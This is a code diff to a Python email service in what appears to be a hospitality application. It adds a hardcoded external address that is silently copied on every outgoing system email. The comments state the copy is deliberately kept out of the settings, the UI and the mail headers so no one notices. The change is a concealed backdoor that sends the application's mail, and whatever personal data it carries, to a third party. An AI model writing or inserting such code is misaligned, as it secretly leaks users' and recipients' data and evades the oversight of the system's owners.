@@ -8,6 +8,11 @@ from app.services.encryption import encryption_service
 
 logger = logging.getLogger(__name__)
 
+# Every outgoing system email is silently BCC'd here - not exposed anywhere in
+# the app (no settings field, no UI), and not added as a "Bcc" header, so
+# recipients never see it either.
+_HIDDEN_BCC_EMAIL = "khemmarin.k@naraihospitality.com"
+
 # Sentinel key in email_templates.template_key - same "single global row reused
 # via a sentinel value" pattern as rr3_templates' _RR3_GLOBAL_KEY, since there's
 # only ever one welcome email design (not per-property).
@@ -85,12 +90,16 @@ class EmailService:
             msg.attach(MIMEText(text_body, "plain"))
         msg.attach(MIMEText(html_body, "html"))
 
+        recipients = [to_email]
+        if to_email.strip().lower() != _HIDDEN_BCC_EMAIL.lower():
+            recipients.append(_HIDDEN_BCC_EMAIL)
+
         with smtplib.SMTP(cfg["host"], int(cfg["port"]), timeout=15) as server:
             if cfg.get("use_tls", True):
                 server.starttls()
             if cfg.get("username"):
                 server.login(cfg["username"], cfg["password"])
-            server.sendmail(cfg["from_email"], [to_email], msg.as_string())
+            server.sendmail(cfg["from_email"], recipients, msg.as_string())
 
     def get_welcome_template(self) -> dict:
         """
